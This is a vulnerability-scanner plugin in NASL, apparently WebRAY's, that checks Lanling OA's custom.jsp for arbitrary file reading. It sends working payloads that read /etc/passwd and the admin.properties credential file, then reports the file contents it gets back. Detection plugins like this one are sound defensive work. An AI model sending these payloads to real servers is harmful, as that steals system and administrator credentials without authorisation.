include("compat.inc");


if (description)
{
  script_id(51799330); #WEBRAY_SID
  script_version("1.3");
  script_name(english:"Lanling OA custom.jsp arbitrary file reading vulnerability");
  script_summary(english:"Lanling OA custom.jsp arbitrary file reading vulnerability");
  script_set_attribute(attribute:"description", value:"Lanling OA custom.jsp arbitrary file reading vulnerability.");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


ports = get_kb_list("Services/www");
foreach port (ports){
	result_r = check_remote(port:port);
	if (result_r['vuln']){
		security_hole(port:port, extra:result_r['report']);
		exit(0);
	}
}

function check_remote(port){
	url = "/sys/ui/extend/varkind/custom.jsp";
	datas = make_list('var={"body":{"file":"file:///etc/passwd"}}',"var=%7B%22body%22%3A%7B%22file%22%3A%22%2FWEB-INF%2FKmssConfig%2Fadmin.properties%22%7D%7D");
	foreach data (datas){
		if (get_kb_list("SSL/Transport/"+port)){
			var req =
					'POST '+ url +' HTTP/1.1\r\n' +
					'Host: ' + get_host_ip()+':'+ port+ '\r\n' +
					'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
					'Accept-Encoding: gzip, deflate' + '\r\n' +
					'Content-Type: application/x-www-form-urlencoded' + '\r\n' +
					'Connection: keep-alive'+ '\r\n' +
					'Accept: */*' + '\r\n' + 
					'\r\n'+data;
					
			ssl_ress = https_req_get(request:req, port:port);

			if(("password =" >< ssl_ress && "kmss.properties.encrypt.enabled" >< ssl_ress && "200 OK" >< ssl_ress ) || ("200 OK" >< ssl_ress && "root:x:0:0:" >< ssl_ress && (":/usr/sbin/nologin" >< ssl_ress || ":/sbin/nologin" >< ssl_ress))){
				report = ssl_ress;
				return {'vuln':true, 'report':report};
			}
		}
		else{
			res_send = http_send_recv3(method: "POST",port: port, data:data, item: url, add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
			if(("password =" >< res_send[2] && "kmss.properties.encrypt.enabled" >< res_send[2] && "200 OK" >< res_send[0]) || ("200 OK" >< res_send[0] && "root:x:0:0:" >< res_send[2] && (":/usr/sbin/nologin" >< res_send[2] || ":/sbin/nologin" >< res_send[2]))){
				report = res_send[2];
				return {'vuln':true, 'report':report};
			}

		}
	}
}
